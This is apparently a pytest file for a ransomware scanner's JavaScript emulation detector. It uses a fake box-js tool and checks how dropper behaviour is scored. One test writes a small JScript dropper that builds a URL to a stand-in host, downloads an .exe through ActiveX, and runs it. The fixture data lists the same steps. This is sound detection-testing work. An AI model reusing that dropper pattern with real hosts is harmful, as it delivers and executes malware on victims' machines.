"""detectors/emulation.py and the emulation layer. A fake box-js (a small script
that writes the result files box-js would) stands in for the real tool; the
last test uses the real box-js when it is installed."""

import json
import os
import shutil
import sys

import pytest

import RansomwareScanner as RS
from detectors.emulation import ScriptEmulator, _read_results
from tests.test_scanner_integration import _config

pytestmark = pytest.mark.skipif(os.name != "posix", reason="fake tool is a POSIX script")

DROPPER_IOCS = [
    {"type": "UrlFetch", "value": {"method": "GET", "url": "http://dl.example.invalid/a.exe"}},
    {"type": "FileWrite", "value": {"file": "C:\\Users\\Public\\a.exe"}},
    {"type": "Run", "value": {"command": "C:\\Users\\Public\\a.exe"}},
]


def _fake_boxjs(bin_dir, urls, iocs):
    """A stand-in that writes <out>/sample.js.results/{urls,IOC}.json like box-js."""
    bin_dir.mkdir(exist_ok=True)
    tool = bin_dir / "box-js"
    tool.write_text(f"""#!{sys.executable}
import json, sys, pathlib
out = next(a.split("=", 1)[1] for a in sys.argv if a.startswith("--output-dir="))
res = pathlib.Path(out) / "sample.js.results"
res.mkdir(parents=True)
(res / "urls.json").write_text({json.dumps(json.dumps(urls))})
(res / "IOC.json").write_text({json.dumps(json.dumps(iocs))})
""")
    tool.chmod(0o755)
    return tool


@pytest.fixture
def scanner_with(tmp_path, monkeypatch):
    def make(urls, iocs):
        _fake_boxjs(tmp_path / "bin", urls, iocs)
        monkeypatch.setenv("PATH", f"{tmp_path / 'bin'}{os.pathsep}{os.environ.get('PATH', '')}")
        return RS.RansomwareScanner(_config(tmp_path, cache_enabled=False, emulation_enabled=True))
    return make


def test_off_by_default(tmp_path):
    sc = RS.RansomwareScanner(_config(tmp_path, cache_enabled=False))
    assert sc.emulator is None
    js = tmp_path / "scan" / "a.js"
    js.write_text("var a = 1;")
    assert "emulation" not in sc.scan_file(str(js))["scan_results"]


def test_emulated_dropper_is_scored_as_dynamic_evidence(scanner_with, tmp_path):
    sc = scanner_with(["http://dl.example.invalid/a.exe"], DROPPER_IOCS)
    js = tmp_path / "scan" / "invoice.js"
    js.write_text('var p = ["dl","example","invalid"].join("."); /* built at run time */')
    r = sc.scan_file(str(js))
    emu = r["scan_results"]["emulation"]
    assert emu["ran"] and emu["downloads_and_runs"] and emu["commands"] == ["C:\\Users\\Public\\a.exe"]
    contrib = {c["indicator"]: c for c in r["score_breakdown"]["contributions"]}
    assert contrib["emulated_dropper"]["category"] == "dynamic"
    assert "hxxp://dl.example[.]invalid" in contrib["emulated_dropper"]["detail"]   # defanged
    assert r["verdict"] in ("High", "Critical")
    assert "[Emulation]" in sc.generate_report([r])


def test_network_only_and_quiet_scripts(scanner_with, tmp_path):
    sc = scanner_with(["https://cdn.example/lib.js"], [])
    js = tmp_path / "scan" / "page.js"
    js.write_text("fetch('https://cdn.example/lib.js')")
    ind = {c["indicator"] for c in sc.scan_file(str(js))["score_breakdown"]["contributions"]}
    assert "emulated_network" in ind and "emulated_dropper" not in ind
    doc = tmp_path / "scan" / "notes.txt"                 # not JavaScript: not emulated
    doc.write_text("hello")
    assert "emulation" not in sc.scan_file(str(doc))["scan_results"]


def test_hostile_result_files_are_handled(tmp_path):
    res = tmp_path / "out" / "x.js.results"
    res.mkdir(parents=True)
    (res / "urls.json").write_text('{"not": "a list"}')
    (res / "IOC.json").write_text('[1, "x", {"type": "Run"}, {"type": "Run", "value": {"command": 5}}]')
    r = _read_results(tmp_path / "out")
    assert r.ran and r.urls == [] and r.commands == ["5"]
    empty = tmp_path / "empty"
    empty.mkdir()
    assert not _read_results(empty).ran
    assert "not found" in ScriptEmulator(tool="no-such-tool-xyz").emulate(str(tmp_path / "a.js")).detail


@pytest.mark.skipif(not shutil.which("box-js"), reason="box-js not installed")
def test_real_boxjs_extracts_a_runtime_built_url(tmp_path):
    js = tmp_path / "drop.js"
    js.write_text('var u = "ht" + "tp://" + ["dl", "example", "invalid"].join(".") + "/a.exe";\n'
                  'var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET", u, false); x.send();\n'
                  'new ActiveXObject("WScript.Shell").Run("C:\\\\Users\\\\Public\\\\a.exe");\n')
    r = ScriptEmulator().emulate(str(js))
    assert r.ran and "http://dl.example.invalid/a.exe" in r.urls and r.downloads_and_runs
